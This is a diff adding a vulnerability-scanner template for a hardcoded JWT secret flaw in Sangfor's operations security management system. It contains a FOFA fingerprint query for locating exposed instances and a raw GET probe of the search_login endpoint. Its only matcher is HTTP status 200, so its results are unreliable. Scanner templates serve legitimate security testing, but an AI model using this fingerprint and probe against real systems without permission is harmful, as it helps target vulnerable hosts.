@@ -1,0 +1,27 @@
+id: poc-wgsf68x6ww8cuere
+info:
+  name: 深信服运维安全管理系统 search_login Jwt秘钥硬编码漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgsf68x6ww8cuere'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wgsf68x6ww8cuere
+    fofa: body="/fort/login" && header="FORTSESSIONID"
+http:
+- raw:
+  - 'GET /fort/login/search_login HTTP/1.1
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
